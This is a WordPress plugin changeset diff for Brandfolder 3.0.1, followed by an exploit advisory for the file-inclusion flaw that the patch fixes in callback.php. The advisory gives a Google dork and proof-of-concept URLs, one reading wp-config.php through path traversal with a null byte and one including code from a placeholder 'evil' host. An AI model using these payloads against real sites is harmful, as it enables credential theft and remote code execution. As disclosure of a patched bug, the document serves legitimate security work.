
https://plugins.trac.wordpress.org/changeset/1377152/brandfolder

#############
#############
#############
#############

Changeset 1377152 for brandfolder
View differences 
inline
 Show 
2
 lines around each change
 Show the changes in full context
Ignore:
 Blank lines
 Case changes
 White space changes
Timestamp:
03/23/2016 04:26:49 PM (6 years ago)
Author:
parterburn
Message:
v 3.0.1
Location:
brandfolder
Files:
6 added3 edited

tags/3.0.1
tags/3.0.1/brandfolder.php
tags/3.0.1/callback.php
tags/3.0.1/favicon.png
tags/3.0.1/logo.png
tags/3.0.1/readme.txt
trunk/brandfolder.php (2 diffs)
trunk/callback.php (1 diff)
trunk/readme.txt (1 diff)
UnmodifiedAddedRemoved
TabularUnifiedbrandfolder/trunk/brandfolder.php 
r1274809	r1377152	 
4	4	Plugin URI: http://wordpress.org/plugins/brandfolder/
5	5	Description: Adds the ability for you to edit your Brandfolder inside Wordpress, easily embed it using our Popup Embed, and integrates with the Media Library.
6	 	Version: 3.0
 	6	Version: 3.0.1
7	7	Author: Brandfolder, Inc.
8	8	Author URI: http://brandfolder.com
…	…	 
264	264	    }
265	265	
266	 	    function brandfolder_resize() {
267	 	      jQuery("#brandfolder-embed-iframe").iframeHeight();
268	 	    }
269	 	
270	266	    jQuery(document).ready(
271	267	      function () {
272	268	        brandfolder_loadScript('//cdn.brandfolder.com/bf.min.js', brandfolder_null);
273	 	
274	 	        if (jQuery("#brandfolder-embed-iframe").length > 0){
275	 	          brandfolder_loadScript("<?php echo plugins_url('iframeheight.js', __FILE__); ?>", brandfolder_resize);
276	 	        }
277	269	    });
278	270	
TabularUnifiedbrandfolder/trunk/callback.php 
r1109670	r1377152	 
1	1	<?php
2	 	  ini_set('display_errors',1);
3	 	  ini_set('display_startup_errors',1);
4	 	  error_reporting(-1);
5	 	 
6	 	  require_once($_REQUEST['wp_abspath']  . 'wp-load.php');
7	 	  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/media.php');
8	 	  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/file.php');
9	 	  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/image.php');
10	 	  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/post.php');
 	2	  $parse_uri = explode( 'wp-content', $_SERVER['SCRIPT_FILENAME'] );
 	3	  $abspath = $parse_uri[0];
 	4	  require_once($abspath . 'wp-load.php');
 	5	  require_once($abspath . 'wp-admin/includes/media.php');
 	6	  require_once($abspath . 'wp-admin/includes/file.php');
 	7	  require_once($abspath . 'wp-admin/includes/image.php');
 	8	  require_once($abspath . 'wp-admin/includes/post.php');
11	9	
12	10	  $url = $_REQUEST['attachment_url'];
TabularUnifiedbrandfolder/trunk/readme.txt 
r1274813	r1377152	 
3	3	Tags: brand asset management, brand management, digital asset management, DAM, logo upload, logo management, share your logo, marketing tool, brand building
4	4	Requires at least: 3.0
5	 	Tested up to: 4.3.1
6	 	Stable tag: 3.0
 	5	Tested up to: 4.4.2
 	6	Stable tag: 3.0.1
7	7	
8	8	Our simple plugin creates a beautiful web view for anybody to access your logos, product images, brand information, and plenty more.

############################
############################

# Exploit Title: Wordpress brandfolder plugin / RFI & LFI
# Google Dork: inurl:wp-content/plugins/brandfolder
# Date: 03/22/2016
# Exploit Author: AMAR^SHG
# Vendor Homepage: https://brandfolder.com
# Software Link: https://wordpress.org/plugins/brandfolder/
# Version: <=3.0
# Tested on: WAMP / Windows

I-Details
The vulnerability occurs at the first lines of the file callback.php:

<?php
  ini_set('display_errors',1);
  ini_set('display_startup_errors',1);
  error_reporting(-1);

  require_once($_REQUEST['wp_abspath']  . 'wp-load.php');
  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/media.php');
  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/file.php');
  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/image.php');
  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/post.php');

$_REQUEST is based on the user input, so as you can guess,
an attacker can depending on the context, host on a malicious server
a file called wp-load.php, and disable its execution using an htaccess, or
abuse the null byte character ( %00, %2500 url-encoded)

II-Proof of concept
http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=LFI/RFI
http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00
http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=http://evil/

Discovered by AMAR^SHG (aka kuroi'sh).
Greetings to RxR & Nofawkx Al & HolaKo

